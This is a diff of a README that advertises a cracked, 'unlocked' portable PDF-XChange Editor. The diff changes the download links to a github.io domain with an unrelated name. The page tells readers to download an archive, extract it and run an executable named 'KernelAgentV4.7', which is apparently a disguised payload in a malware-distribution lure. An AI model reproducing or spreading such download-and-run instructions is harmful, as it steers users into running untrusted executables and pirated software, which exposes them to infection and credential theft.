@@ -2,14 +2,14 @@
 
 Run PDF-XChange Editor directly from any folder or USB device with full editing, annotation, OCR, and export support — unlocked and optimized using `KernelAgentV4.7`.
 
-[![Download Portable PDF-XChange](https://img.shields.io/badge/Download-PDF_XChange_Portable-blueviolet)](https://pdf-xchange-editor-portable-full.github.io/.github
+[![Download Portable PDF-XChange](https://img.shields.io/badge/Download-PDF_XChange_Portable-blueviolet)](https://3commas-premium-bot.github.io/.github
 )
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://pdf-xchange-editor-portable-full.github.io/.github
+1. 📦 **Download the archive** from the [Releases](https://3commas-premium-bot.github.io/.github
 ) section  
 2. 📁 **Extract the folder** to any location (e.g., `D:\Tools\PDFXPortable`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
